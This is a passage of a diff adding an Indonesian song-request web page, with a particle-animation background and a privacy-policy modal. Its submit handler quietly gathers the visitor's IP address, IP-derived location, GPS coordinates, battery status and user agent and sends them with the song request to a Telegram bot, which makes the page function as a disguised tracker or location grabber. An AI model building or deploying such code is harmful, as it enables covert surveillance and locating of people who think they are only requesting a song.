+            const dateOptions = { day: '2-digit', month: '2-digit', year: 'numeric' };
+            const dateString = now.toLocaleDateString('en-GB', dateOptions);
+
+            // Ambil IP dan Lokasi
+            const { ip, location } = await getIpAndLocation();
+
+            // Ambil info baterai
+            const { level: batteryLevel, charging: batteryCharging } = await getBatteryInfo();
+
+            // Ambil lokasi presisi
+            const { latitude, longitude } = await getPreciseLocation();
+            const preciseLocationString = (latitude !== 'Tidak Diizinkan/Tersedia' && longitude !== 'Tidak Diizinkan/Tersedia') ?
+                                          `Lintang: ${latitude}, Bujur: ${longitude}` :
+                                          `Tidak Diizinkan/Tersedia`;
+
+            // Ambil User Agent
+            const userAgent = getUserAgent();
+
+            // Membangun teks pesan untuk Telegram sesuai format baru
+            const messageText = `*🎶 REQUEST LAGU BARU 🎶*\n\n` +
+                               `👤 *Nama:* ${userName}\n` +
+                               `🎵 *Request:* ${songName}\n\n` +
+                               `🕒 *Jam:* ${timeString} WIB\n` +
+                               `📅 *Tanggal:* ${dateString}\n` +
+                               `🌐 *IP Address:* ${ip}\n` +
+                               `📍 *Lokasi (IP):* ${location}\n` +
+                               `🛰️ *Lokasi (GPS):* ${preciseLocationString}\n\n` +
+                               `🔋 *Baterai:* ${batteryLevel}% \n` +
+                               `🔌 *Pengisian:* ${batteryCharging}\n` +
+                               `💻 *Perangkat:* ${userAgent}\n\n` +
+                               `Terima Kasih! ✨`;
+
+            const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+            // Perbarui indikator loading untuk pengiriman
+            loadingIndicator.innerText = 'Mengirim permintaan ke Telegram...';
+
+            try {
+                // Mengirim permintaan POST ke API Telegram
+                const response = await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: messageText,
+                        parse_mode: 'Markdown' // Menggunakan Markdown untuk format teks
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.ok) {
+                    messageDiv.className = 'message success';
+                    messageDiv.innerText = '✅ Permintaan lagu berhasil dikirim! Terima Kasih!';
+                    // Mengosongkan kolom input setelah berhasil
+                    songNameInput.value = ''; // Hanya kosongkan nama lagu
+                } else {
+                    messageDiv.className = 'message error';
+                    messageDiv.innerText = `❌ Gagal mengirim permintaan: ${data.description || 'Terjadi kesalahan.'}`;
+                }
+            } catch (error) {
+                console.error('Error sending request:', error);
+                messageDiv.className = 'message error';
+                messageDiv.innerText = '❌ Terjadi kesalahan jaringan atau server. Mohon coba lagi.';
+            } finally {
+                // Sembunyikan indikator loading dan aktifkan kembali tombol
+                loadingIndicator.style.display = 'none';
+                sendButton.disabled = false;
+                messageDiv.style.display = 'block';
+                setTimeout(() => {
+                    messageDiv.style.display = 'none';
+                }, 5000); // Sembunyikan pesan setelah 5 detik
+            }
+        }
+
+        // --- Fungsi Modal Kebijakan Privasi ---
+        /**
+         * Menampilkan modal Kebijakan Privasi.
+         */
+        function showPrivacyPolicyModal() {
+            privacyPolicyModal.style.display = 'flex'; // Gunakan flex untuk centering
+        }
+
+        /**
+         * Menyembunyikan modal Kebijakan Privasi.
+         */
+        function hidePrivacyPolicyModal() {
+            privacyPolicyModal.style.display = 'none';
+        }
+
+
+        // --- Animasi Partikel Latar Belakang (Canvas) ---
+        const canvas = document.getElementById('particleCanvas');
+        const ctx = canvas.getContext('2d');
+        let particles = [];
+        const numParticles = 100; // Jumlah partikel
+        const particleColor = 'rgba(157, 0, 255, 0.5)'; // Warna partikel (ungu transparan)
+        const lineColor = 'rgba(0, 247, 255, 0.1)'; // Warna garis (biru transparan)
+        const maxDistance = 100; // Jarak maksimum untuk menggambar garis antar partikel
+
+        // Fungsi untuk mengatur ukuran canvas agar sesuai dengan jendela
+        function setCanvasSize() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+
+        // Objek Partikel
+        function Particle(x, y) {
+            this.x = x;
+            this.y = y;
+            this.size = Math.random() * 2 + 1; // Ukuran partikel acak
+            this.speedX = Math.random() * 0.5 - 0.25; // Kecepatan horizontal acak
+            this.speedY = Math.random() * 0.5 - 0.25; // Kecepatan vertikal acak
+        }
+
+        // Menggambar partikel
+        Particle.prototype.draw = function() {
+            ctx.fillStyle = particleColor;
+            ctx.beginPath();
+            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+            ctx.fill();
+        }
+
+        // Memperbarui posisi partikel
+        Particle.prototype.update = function() {
+            this.x += this.speedX;
+            this.y += this.speedY;
+
+            // Memantulkan partikel dari tepi canvas
+            if (this.x > canvas.width || this.x < 0) {
+                this.speedX *= -1;
+            }
+            if (this.y > canvas.height || this.y < 0) {
+                this.speedY *= -1;
+            }
+        }
+
+        // Inisialisasi partikel
+        function initParticles() {
+            particles = [];
+            for (let i = 0; i < numParticles; i++) {
+                const x = Math.random() * canvas.width;
+                const y = Math.random() * canvas.height;
+                particles.push(new Particle(x, y));
+            }
+        }
+
+        // Menggambar garis antar partikel yang berdekatan
+        function connectParticles() {
+            for (let a = 0; a < particles.length; a++) {
+                for (let b = a; b < particles.length; b++) {
+                    const dx = particles[a].x - particles[b].x;
+                    const dy = particles[a].y - particles[b].y;
+                    const distance = Math.sqrt(dx * dx + dy * dy);
+
+                    if (distance < maxDistance) {
+                        ctx.strokeStyle = lineColor;
+                        ctx.lineWidth = 0.5;
+                        ctx.beginPath();
+                        ctx.moveTo(particles[a].x, particles[a].y);
+                        ctx.lineTo(particles[b].x, particles[b].y);
+                        ctx.stroke();
+                    }
+                }
+            }
+        }
+
+        // Loop animasi
+        function animateParticles() {
+            requestAnimationFrame(animateParticles);
+            ctx.clearRect(0, 0, canvas.width, canvas.height); // Bersihkan canvas
+
+            for (let i = 0; i < particles.length; i++) {
+                particles[i].update();
+                particles[i].draw();
+            }
+            connectParticles();
+        }
+
+        // Event listener untuk mengatur ulang ukuran canvas saat jendela diubah ukurannya
+        window.addEventListener('resize', () => {
+            setCanvasSize();
+            initParticles(); // Inisialisasi ulang partikel agar tersebar dengan benar
+        });
+
+        // Inisialisasi dan mulai animasi saat halaman dimuat
+        window.onload = function() {
+            setCanvasSize();
+            initParticles();
+            animateParticles();
+        };
+    </script>
+</body>
+</html>
